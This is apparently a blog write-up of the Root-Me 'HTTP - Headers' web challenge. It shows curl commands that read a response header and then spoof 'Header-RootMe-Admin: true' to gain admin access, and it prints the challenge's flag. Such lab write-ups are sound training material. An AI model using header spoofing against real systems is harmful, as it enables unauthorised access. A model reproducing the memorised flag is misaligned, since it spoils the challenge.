---
title: HTTP - Headers
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation, Authentication vulnerabilities]
---

* Points: 15
* Link: https://www.root-me.org/en/Challenges/Web-Server/HTTP-Headers

## Statement

> Get an administrator access to the webpage.

### Hint

> HTTP response give informations

## Solution

Let's visit the site:
```sh
curl -i http://challenge01.root-me.org/web-serveur/ch5/
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 20 Jun 2023 13:27:33 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
Header-RootMe-Admin: none
```

```html
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<p>Content is not the only part of an HTTP response!</p>
</body>
</html>
```

Check here
```
Header-RootMe-Admin: none
```

Let's try
```sh
curl -H "Header-RootMe-Admin: true" http://challenge01.root-me.org/web-serveur/ch5/
```

```html
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<p>Content is not the only part of an HTTP response!</p>
<p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful
</p></body>
</html>
```

The flag is
```
HeadersMayBeUseful
```
